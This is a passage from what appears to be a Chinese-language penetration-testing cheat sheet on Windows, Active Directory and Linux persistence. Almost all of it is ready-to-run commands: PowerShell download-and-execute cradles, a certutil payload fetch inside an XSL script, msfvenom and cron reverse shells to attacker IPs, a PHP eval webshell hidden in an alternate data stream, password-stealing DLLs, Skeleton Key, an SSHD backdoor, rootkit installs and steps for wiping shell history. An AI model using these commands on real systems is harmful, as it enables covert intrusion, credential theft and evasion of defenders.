-PsCommand &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.0.107/xxxx&#39;)&quot; 远程木马脚本可用CS/Empire生成&gt;net stop mssqlserver&gt;net start mssqlserver映像劫持&gt;powershell -nop -ep bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1&#39;);Get-SQLPersistRegDebugger -Verbose -FileName sethc.exe -Command &quot;c:\windows\system32\cmd.exe&quot; -Instance &quot;zone.com\sub2k8&quot;&quot;DDL事件触发&gt;powershell -exec bypass &gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/Invoke-SqlServer-Persist-TriggerDDL.psm1&#39;) &gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot;zone\sub2k8&quot; -PsCommand &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.0.107/xxxx&#39;)&quot;  远程木马文件可用CS/Empire生成&gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot; zone\sub2k8&quot; -Remove   移除后门</code></pre><h3 id="NSSM"><a href="#NSSM" class="headerlink" title="NSSM"></a>NSSM</h3><pre><code>http://www.nssm.cc/release/nssm-2.24.zipNSSM封装可执行程序为系统服务&gt;nssm install 服务名称会自动弹出设置</code></pre><p><img src="./img/512.png" alt="image"></p><pre><code>Path选择powershell的路径，arguments直接输入参数。启动服务&gt;nssm start 服务名称</code></pre><p><img src="./img/513.png" alt="image"></p><pre><code>会上线</code></pre><p><img src="./img/514.png" alt="image"></p><pre><code>重启电脑，权限也会维持删除服务&gt;nssm remove &lt;servicename&gt;</code></pre><p><img src="./img/515.png" alt="image"></p><h3 id="添加签名"><a href="#添加签名" class="headerlink" title="添加签名"></a>添加签名</h3><pre><code>https://github.com/secretsquirrel/SigThief&gt;python sigthief.py -i 被窃取的文件 -t 要添加签名的恶意文件 -o 保存文件&gt;python sigthief.py -i rarext.dll -t rarextdwa.dll -o 1.dll</code></pre><p><img src="./img/516.png" alt="image"><br><img src="./img/517.png" alt="image"><br><img src="./img/518.png" alt="image"><br><img src="./img/519.png" alt="image"></p><h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><pre><code>Meterpreter&gt; run metsvc -A在C:Windows\TEMP下随机生成目录三个文件，创建服务metsvc 31337端口连接后门Msf&gt;use exploit/multi/handlerMsf&gt;set payload windows/metsvc_bind_tcpMsf&gt;set rhost 192.168.1.2Msf&gt;set rport 31337Msf&gt;run删除服务Meterpreter &gt; run metsvc –r</code></pre><h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><pre><code>Meterpreter&gt;run persistence -X -i 10 -r 192.168.1.9 -p 4444-X系统启动时运行-i每隔10秒尝试连接服务端连接后门Msf&gt;use exploit/multi/handlerMsf&gt;set payload windows/meterpreter/reverse_tcpMsf&gt;set lhost 192.168.1.1Msf&gt;set lport 4444Msf&gt;run</code></pre><h3 id="HookPasswordChangeNotify"><a href="#HookPasswordChangeNotify" class="headerlink" title="HookPasswordChangeNotify"></a>HookPasswordChangeNotify</h3><pre><code>使用VS2015开发环境，MFC设置为在静态库中使用MFC编译工程，生成HookPasswordChange.dllhttps://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1在代码尾部添加如下代码：&gt;Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass并命名为HookPasswordChangeNotify.ps1上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll管理员权限执行&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1C:\Windows\Temp下可以找到passwords.txt&amp;https://gitee.com/RichChigga/PasswordchangeNotify上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll 管理员权限执行：&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1在C:\Windows\System32 新建文件system.ini第一行是连接的ip 第二行是端口</code></pre><p><img src="./img/520.png" alt="image"></p><h3 id="NPPSpy记录密码"><a href="#NPPSpy记录密码" class="headerlink" title="NPPSpy记录密码"></a>NPPSpy记录密码</h3><pre><code>https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/NPPSPy.c默认保存位置是C盘根目录，可以修改重新编译</code></pre><p><img src="./img/729.png" alt="image"></p><pre><code>将DLL放入system32文件夹内</code></pre><p><img src="./img/730.png" alt="image"></p><pre><code>执行ps1脚本自动添加注册表</code></pre><p><img src="./img/731.png" alt="image"></p><pre><code>无需重启</code></pre><p><img src="./img/732.png" alt="image"></p><h3 id="Password-Filter-DLL"><a href="#Password-Filter-DLL" class="headerlink" title="Password Filter DLL"></a>Password Filter DLL</h3><pre><code>https://github.com/3gstudent/PasswordFiltervisualstudio生成解决方案DLL放在%windir%\system32\下HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的Notification Packages，添加Win32Project3</code></pre><p><img src="./img/521.png" alt="image"></p><pre><code>&gt;REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot;&gt;REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\0rassfm\0Win32Project3&quot; /f重启之后只要修改用户的密码，即可记录</code></pre><p><img src="./img/522.png" alt="image"></p><pre><code>文件默认在C盘根目录，可在源码中修改</code></pre><p><img src="./img/523.png" alt="image"></p><h3 id="WMIC事件订阅"><a href="#WMIC事件订阅" class="headerlink" title="WMIC事件订阅"></a>WMIC事件订阅</h3><pre><code>每隔30秒加载一次payload&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;,CommandLineTemplate=&quot;远程调用(powershell,regsvr32,mshta等)&quot;&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;</code></pre><p><img src="./img/524.png" alt="image"></p><pre><code>重启维持卸载后门&gt;Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&#39;BotFilter82&#39;&quot; | Remove-WmiObject -Verbose&gt;Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&#39;BotConsumer23&#39;&quot; | Remove-WmiObject -Verbose&gt;Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &#39;%BotFilter82%&#39;&quot; | Remove-WmiObject -Verbose</code></pre><h3 id="WMI-Persistence"><a href="#WMI-Persistence" class="headerlink" title="WMI-Persistence"></a>WMI-Persistence</h3><pre><code>https://gitee.com/RichChigga/WMI-Persistencecobalt strike -&gt;payload generator-&gt;powershell(use x64)</code></pre><p><img src="./img/525.png" alt="image"></p><pre><code>attack-&gt;文件下载，文件选择payload generator的脚本，local uri为随意文件</code></pre><p><img src="./img/526.png" alt="image"></p><pre><code>生成后地址替换进WMI-Persistence脚本内</code></pre><p><img src="./img/527.png" alt="image"></p><pre><code># powershell -exec bypassPS &gt; Import-Module .\WMI-Persistence.ps1PS &gt; Install-Persistence</code></pre><p><img src="./img/528.png" alt="image"></p><pre><code>PS &gt; Check-WMI  重启后即可上线system权限(要等待4-6分钟)</code></pre><p><img src="./img/529.png" alt="image"></p><pre><code>自定义上线</code></pre><p><img src="./img/530.png" alt="image"></p><pre><code>attack-&gt;文件下载，exe木马指定为文件。local uri为随意文件，wmi.xsl放在web目录</code></pre><p><img src="./img/531.png" alt="image"></p><pre><code>修改wmi.xsl</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stylesheet</span><span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/XSL/Transform<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ms</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:schemas-microsoft-com:xslt<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xmlns:</span>user</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span><span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>output</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ms:</span>script</span> <span class="token attr-name">implements-prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token cdata">&lt;![CDATA[    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c certutil -urlcache -split -f http://192.168.0.107/load.jpg %temp%/load.exe &amp; %temp%/load.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/load.jpg delete",0);    ]]></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ms:</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stylesheet</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./img/532.png" alt="image"></p><pre><code>WMI-Persistence脚本修改payload地址为wmi.xsl$finalPayload=&quot; wmic os get /FORMAT:`&quot;$Payload`&quot;&quot;</code></pre><p><img src="./img/533.png" alt="image"></p><pre><code>&gt;powershell -exec bypassPS &gt; Import-Module .\WMI-Persistence.ps1PS &gt; Install-PersistencePS &gt; Check-WMIPS &gt; Remove-Persistence 删除模块重启后即可上线</code></pre><p><img src="./img/534.png" alt="image"></p><h3 id="Invoke-Tasksbackdoor"><a href="#Invoke-Tasksbackdoor" class="headerlink" title="Invoke-Tasksbackdoor"></a>Invoke-Tasksbackdoor</h3><pre><code>&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.103/Invoke-taskBackdoor.ps1&#39;);Invoke-Tasksbackdoor -method nccat -ip 192.168.0.103 -port 9999 -time 2&quot;&gt; powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.103/Invoke-taskBackdoor.ps1&#39;);Invoke-Tasksbackdoor -method msf -ip 192.168.0.103 -port 8081 -time 2&quot;</code></pre><p><img src="./img/535.png" alt="image"></p><h3 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h3><pre><code>使用ADS创建一个隐藏文件，创建一个计划任务每隔一分钟请求一次攻击。&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Backdoors/Invoke-ADSBackdoor.ps1&#39;); Invoke-ADSBackdoor -PayloadURL http://192.168.0.107/ps/Schtasks-Backdoor.ps1 -Arguments &#39;Invoke-Tasksbackdoor -method nccat -ip 192.168.0.107 -port 12138 -time 1&#39;&quot;</code></pre><p><img src="./img/536.png" alt="image"><br><img src="./img/537.png" alt="image"><br><img src="./img/538.png" alt="image"><br>    生成<br>    &gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.107 LPORT=12138 -f powershell -o /var/www/html/ads<br>    #use exploit/multi/handler<br>    #set payload windows/x64/meterpreter/reverse_https<br>    #run</p><h3 id="ADS隐藏webshell"><a href="#ADS隐藏webshell" class="headerlink" title="ADS隐藏webshell"></a>ADS隐藏webshell</h3><pre><code>指定宿主文件，index.php是网页正常文件&gt;echo ^&lt;?php @eval($_POST[&#39;chopper&#39;]);?^&gt; &gt; index.php:hidden.jpg&lt;?php include(‘index.php:hidden.jpg’)?&gt;&lt;?php $a=&quot;696E6465782E7068703&quot;.&quot;A68696464656E2E6A7067&quot;;#hex编码$b=&quot;a&quot;;include(PACK(&#39;H*&#39;,$$b))?&gt;&gt;echo 9527 &gt; 1.txt:flag.txt&gt;notepad 1.txt:flag.txt或不指定宿主文件&gt;echo hide &gt; :key.txt&gt;cd ../&gt;notepad test:key.txt上传处绕过</code></pre><table><thead><tr><th>上传的文件名</th><th>服务器表面现象</th><th>生成的文件内容</th></tr></thead><tbody><tr><td>test.php:a.jpg</td><td>生成test.php</td><td>空</td></tr><tr><td>test.php::$DATA</td><td>生成test.php</td><td><?php phpinfo();?></td></tr><tr><td>test.php::$INDEX_ALLOCATION</td><td>生成test.php文件夹</td><td>\</td></tr><tr><td>test.php::$DATA\0.jpg</td><td>生成0.jpg</td><td><?php phpinfo();?></td></tr></tbody></table><h3 id="ADS-amp-JavaScript"><a href="#ADS-amp-JavaScript" class="headerlink" title="ADS&amp;JavaScript"></a>ADS&amp;JavaScript</h3><pre><code>创建一个txt文件，test.txt，随便添加内容（实际的工具，即用户要用的那个工具）。将程序写入文件流（此处用calc.exe）&gt;type calc.exe &gt; test.txt:calc.exe使用mklink创建文件链接：&gt;mklink config.txt test.txt:calc.exe创建readme.txt，文件内容随便。设置为隐藏。创建readme.js，内容如下：var objShell = new ActiveXObject(&quot;shell.application&quot;);objShell.ShellExecute(&quot;cmd.exe&quot;, &quot;/c config.txt&quot;, &quot;&quot;, &quot;open&quot;, 0);objShell.ShellExecute(&quot;README.txt&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 1);执行readme.js，运行calc.exe ，打开readme.txt</code></pre><h3 id="Empire-3"><a href="#Empire-3" class="headerlink" title="Empire"></a>Empire</h3><h4 id="LNK后门"><a href="#LNK后门" class="headerlink" title="LNK后门"></a>LNK后门</h4><pre><code>EmpireEmpire&gt; set Host http://192.168.1.150Empire&gt; set Port 8080&gt;launcher powershell Listener&#39;s Name生成后只使用Base64的代码。&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1&#39;);Invoke-BackdoorLNK -LNKPath &#39;C:\Users\Administrator.DC\Desktop\Easy CHM.lnk&#39; -EncScript Base64编码&quot;</code></pre><p><img src="./img/539.png" alt="image"><br><img src="./img/540.png" alt="image"><br><img src="./img/541.png" alt="image"><br><img src="./img/542.png" alt="image"></p><pre><code>清除后门&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1&#39;);Invoke-BackdoorLNK -LNKPath &#39;C:\Users\Administrator.DC\Desktop\Easy CHM.lnk&#39; -CleanUp&quot;</code></pre><p><img src="./img/543.png" alt="image"></p><h4 id="WMI-2"><a href="#WMI-2" class="headerlink" title="WMI"></a>WMI</h4><pre><code>Empire&gt;powershell/persistence/elevated/wmi</code></pre><h3 id="注入SSP被动收集密码"><a href="#注入SSP被动收集密码" class="headerlink" title="注入SSP被动收集密码"></a>注入SSP被动收集密码</h3><pre><code>需高权限</code></pre><h4 id="Mimikatz-3"><a href="#Mimikatz-3" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>重启失效&gt;privilege::debug&gt;misc::memssp锁屏&gt;rundll32.exe user32.dll,LockWorkStation</code></pre><p><img src="./img/544.png" alt="image"></p><pre><code>登录的账号密码保存在C:\Windows\System32\mimilsa.log</code></pre><p><img src="./img/545.png" alt="image"></p><pre><code>重启有效将mimikatz中的mimilib.dll放入system32目录&gt;reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot; 查看注册表&gt;reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ  添加mimilib</code></pre><p><img src="./img/546.png" alt="image"></p><pre><code>有账号登录密码保存在C:\Windows\System32\kiwissp.log重启也有效</code></pre><p><img src="./img/547.png" alt="image"></p><h4 id="Empire-4"><a href="#Empire-4" class="headerlink" title="Empire"></a>Empire</h4><pre><code>复制mimilib.dll到system32文件夹中&gt;shell copy mimilib.dll C:\Windows\System32\使用模块&gt;usemodule persistence/misc/install_ssp*&gt;set Path C:\Users\Administrator\mimilib.dll</code></pre><h4 id="Powersploit-1"><a href="#Powersploit-1" class="headerlink" title="Powersploit"></a>Powersploit</h4><pre><code>&gt;Import-Module .\PowerSploit.psm1&gt;Install-SSP -Path .\mimilib.dll</code></pre><h3 id="基于域策略文件权限后门"><a href="#基于域策略文件权限后门" class="headerlink" title="基于域策略文件权限后门"></a>基于域策略文件权限后门</h3><pre><code>域的组策略和脚本存放在域控机的C:\Windows\SYSVOL\sysvol\zone.com\Policies目录，域内机器定时访问以更新策略域控机设置policies为everyone完全控制&gt;cacls C:\Windows\SYSVOL\sysvol\zone.com\Policies /e /t /c /g &quot;EveryOne&quot;:f</code></pre><p><img src="./img/548.png" alt="image"></p><pre><code>使用powerview查询域内机对应策略文件PS&gt; Get-NETGPO -ComputerName sub2k8.zone.com |fl gpcfilesyspath打开C:\Windows\SYSVOL\sysvol\zone.com\Policies\&#123;id&#125;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf末尾添加[Registry Values] MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger=1,c:\windows\system32\calc.exe [Version] signature=&quot;$CHICAGO$&quot; Revision=1手动刷新策略&gt;gpupdate /force劫持taskhost.exe，可替换c:\windows\system32\calc.exe为后门文件或语句。</code></pre><h3 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a>Kerberoasting后门</h3><pre><code>当有setspn权限时，为域用户添加一个SPN&gt;setspn -U -A RDP/zone.com godadmin</code></pre><p><img src="./img/549.png" alt="image"></p><pre><code>域内任何主机可以使用Kerberoast 获得TGShttps://github.com/malachitheninja/Invoke-Kerberoast</code></pre><p><img src="./img/550.png" alt="image"></p><pre><code>&gt;Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation |Out-File xx.txt</code></pre><p><img src="./img/551.png" alt="image"></p><pre><code>或使用rubeus.exe</code></pre><p><img src="./img/552.png" alt="image"></p><pre><code>破解&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt</code></pre><h3 id="S4U2Self后门"><a href="#S4U2Self后门" class="headerlink" title="S4U2Self后门"></a>S4U2Self后门</h3><pre><code>域控执行，寻找具备SPN且密码永不过期的账户&gt;Get-ADUser -Filter * -Properties ServicePrincipalName,PasswordNeverExpires| ? &#123;($_.ServicePrincipalName -ne &quot;&quot;) -and ($_.PasswordNeverExpires -eq $true)&#125;</code></pre><p><img src="./img/553.png" alt="image"></p><pre><code>使用mimikatz的dcsync提取用户hash&gt;lsadump::dcsync /domain:zone.com /user:y</code></pre><p><img src="./img/554.png" alt="image"></p><pre><code>布置后门&gt;Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount 账户</code></pre><p><img src="./img/555.png" alt="image"></p><pre><code>布置完成后利用，登录账户y触发后门&gt;Rubeus.exe s4u /user:y /aes256:&#123;aes256&#125; /domain:zone.com /msdsspn:krbtgt /impersonateuser:godadmin</code></pre><p><img src="./img/556.png" alt="image"></p><pre><code>注入票据，获取域控的CIFS、LDAP服务&gt;Rubeus.exe asktgs /ticket:&#123;&#125; /service:cifs/dc.zone.com,ldap/dc.zone.com /ptt</code></pre><p><img src="./img/557.png" alt="image"><br><img src="./img/558.png" alt="image"><br><img src="./img/559.png" alt="image"><br><img src="./img/560.png" alt="image"></p><h3 id="受限委派后门"><a href="#受限委派后门" class="headerlink" title="受限委派后门"></a>受限委派后门</h3><pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1新增一个受限委派服务账户，或添加受限委派后门功能给一个已知账户密码存在的服务账户。需运行在域控制器上，本次演示的是新建后门账户，若是给已知账户密码的服务账户添加功能，步骤一致。PS &gt; Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain zone.com -AllowedToDelegateTo ldap/dc.zone.com密码默认为Password@123!可以修改脚本中$Password参数修改密码。</code></pre><p><img src="./img/561.png" alt="image"><br><img src="./img/562.png" alt="image"></p><pre><code>https://github.com/samratashok/ADModule导入ADModule中的Microsoft.ActiveDirectory.Management.dll和Import-ActiveDirectory.ps1&gt;Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose&gt;Import-Module Import-ActiveDirectory.ps1现以域内普通用户y登录一台域内机器sub2k8，使用kekeo获取TGTKekeo#tgt::ask /user:backdoor /domain:zone.com /password:Passowrd@123!</code></pre><p><img src="./img/563.png" alt="image"></p><pre><code>Kekeo#tgs::s4u /tgt:TGT_backdoor@ZONE.COM_krbtgt~zone.com@ZONE.COM.kirbi /user:godadmin@zone.com /service:ldap/dc.zone.com获取以域管理身份访问ldap的TGS </code></pre><p><img src="./img/564.png" alt="image"></p><pre><code>使用mimikatz写入TGS票据mimikatz#kerberos::ptt C:\Users\y.ZONE\Desktop\kekeo\x64\TGS_godadmin@zone.com@ZONE.COM_ldap~dc.zone.com@ZONE.COM.kirbi</code></pre><p><img src="./img/565.png" alt="image"></p><pre><code>接下来就可以dcsync导出krbtgt的hash，通过krbtgt伪造黄金票据mimikatz#lsadump::dcsync /user:krbtgt /domain:zone.com</code></pre><p><img src="./img/566.png" alt="image"></p><h3 id="Skeleton-Key万能钥匙"><a href="#Skeleton-Key万能钥匙" class="headerlink" title="Skeleton Key万能钥匙"></a>Skeleton Key万能钥匙</h3><pre><code>域控上使用mimikatz执行&gt;privilege::debug&gt;misc::skeleton</code></pre><p><img src="./img/567.png" alt="image"></p><pre><code>可以使用域内任何账号以密码mimikatz登录任意域内主机使用Empire模块&gt;usemodule persistence/misc/skeleton_key*绕过LSA Protection&gt;privilege::debug&gt;!+&gt;!processprotect /process:lsass.exe /remove&gt;misc::skeleton</code></pre><h3 id="唯一IP访问"><a href="#唯一IP访问" class="headerlink" title="唯一IP访问"></a>唯一IP访问</h3><pre><code>&gt;msfvenom -p windows/shell_hidden_bind_tcp LPORT=443 AHOST=192.168.0.107 -f exe &gt; svchost.exe只有当107这台机器连接时可获得shell，其他机器不可以。</code></pre><p><img src="./img/568.png" alt="image"><br><img src="./img/569.png" alt="image"><br><img src="./img/570.png" alt="image"></p><h3 id="Linux-cron后门"><a href="#Linux-cron后门" class="headerlink" title="Linux cron后门"></a>Linux cron后门</h3><pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.107 LPORT=12138 -f raw &gt; /var/www/html/shell.sh(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/shell.sh;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</code></pre><p><img src="./img/571.png" alt="image"></p><pre><code>#!bash(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.1.1/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</code></pre><h3 id="Strace记录ssh密码"><a href="#Strace记录ssh密码" class="headerlink" title="Strace记录ssh密码"></a>Strace记录ssh密码</h3><pre><code>安装strace#apt-get install strace#vi ~/.bashrc添加alias ssh=&#39;strace -o /tmp/.log -e read,write,connect -s 2048 ssh&#39;</code></pre><h3 id="SSHD后门"><a href="#SSHD后门" class="headerlink" title="SSHD后门"></a>SSHD后门</h3><pre><code>&gt;ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;执行后开启31337端口，使用root任意密码登录&gt;ssh root@192.168.1.1 -p 31337</code></pre><h3 id="进程注入-1"><a href="#进程注入-1" class="headerlink" title="进程注入"></a>进程注入</h3><pre><code>http://cymothoa.sourceforge.net/靶机&gt;./cymothoa -p 进程PID -s 1 -y 端口攻击机&gt;nc -vv ip 端口</code></pre><h3 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h3><pre><code>#cd /usr/sbin#mv sshd ../bin#echo &#39;#!/usr/bin/perl&#39; &gt;sshd#echo &#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd#echo &#39;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd#chmod u+x sshd#/etc/init.d/sshd restart攻击机执行&gt;socat STDIO TCP4:192.168.0.110:22,sourceport=13377</code></pre><p><img src="./img/572.png" alt="image"></p><h3 id="SUID-Shell"><a href="#SUID-Shell" class="headerlink" title="SUID Shell"></a>SUID Shell</h3><pre><code>&gt;cp /bin/bash /tmp/tmp&gt;chmod u+s /tmp/tmp&gt;/tmp/tmp -p</code></pre><h3 id="SSH公私钥登录"><a href="#SSH公私钥登录" class="headerlink" title="SSH公私钥登录"></a>SSH公私钥登录</h3><pre><code>&gt;vim /etc/ssh/sshd_conf取消以下注释</code></pre><p><img src="./img/573.png" alt="image"></p><pre><code>&gt;ssh-keygen生成复制/root/.ssh/id_rsa.pub文件到攻击端的/root/.ssh/authorized_keys&gt;ssh -i id_rsa targer@1.1.1.1</code></pre><h3 id="Reptile"><a href="#Reptile" class="headerlink" title="Reptile"></a>Reptile</h3><pre><code>https://github.com/f0rb1dd3n/Reptile安装&gt;apt install build-essential libncurses-dev linux-headers-$(uname -r)&gt;git clone https://github.com/f0rb1dd3n/Reptile.git</code></pre><h3 id="Kbeast-rootkit"><a href="#Kbeast-rootkit" class="headerlink" title="Kbeast_rootkit"></a>Kbeast_rootkit</h3><pre><code>http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gzversion - 0 : 2.6.18 (RHEL/CentOS 5.x)          1 : 2.6.32 (Ubuntu 10.x) [default version]修改配置config.h安装路径、日志路径、端口、连接密码、连接用户</code></pre><p><img src="./img/574.png" alt="image"></p><pre><code>./setup build攻击机连接&gt;telnet 192.168.1.1 13377</code></pre><h3 id="OpenSSH后门"><a href="#OpenSSH后门" class="headerlink" title="OpenSSH后门"></a>OpenSSH后门</h3><pre><code>下载http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gzhttp://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz备份配置文件&gt;mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old&gt;mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old安装关联文件centos&gt;yum install -y openssl openssl-devel pam-devel zlib zlib-develUbuntu&gt;apt-get install -y openssl libssl-dev libpam0g-dev&gt;tar zxvf openssh-5.9p1.tar.gz &gt;tar zxvf 0x06-openssh-5.9p1.patch.tar.gz &gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/&gt;cd openssh-5.9p1&gt;patch &lt;sshbd5.9p1.diff&gt;vim includes.h</code></pre><p><img src="./img/575.png" alt="image"></p><pre><code>/tmp/ilog记录登录到本机的用户密码/tmp/olog记录本机登录其他机器的账户密码日志文件前可以加个.隐藏起来SECRETPW是连接后门密码查看当前版本&gt;ssh -V</code></pre><p><img src="./img/576.png" alt="image"></p><pre><code>修改version.h改为当前版本</code></pre><p><img src="./img/577.png" alt="image"></p><pre><code>编译安装Centos7&gt;./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5&gt;make clean&gt;make &amp;&amp; make install&gt;systemctl restart sshd.serviceubuntu&gt;./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam&gt;make clean&gt;make&amp;&amp;make install重启服务，修改文件日志&gt;touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config&gt;touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</code></pre><p><img src="./img/578.png" alt="image"><br><img src="./img/579.png" alt="image"></p><pre><code>清除痕迹&gt;export HISTFILE=/dev/null&gt;export HISTSIZE=0&gt;export HISTFILESIZE=0&gt;sed -i &#39;s/192.168.0.1/127.0.0.1/g&#39; /root/.bash_history</code></pre><h3 id="IPTables端口复用"><a href="#IPTables端口复用" class="headerlink" title="IPTables端口复用"></a>IPTables端口复用</h3><pre><code>&gt;iptables -t nat -N LETMEIN &gt;iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22# 开启开关&gt;iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein 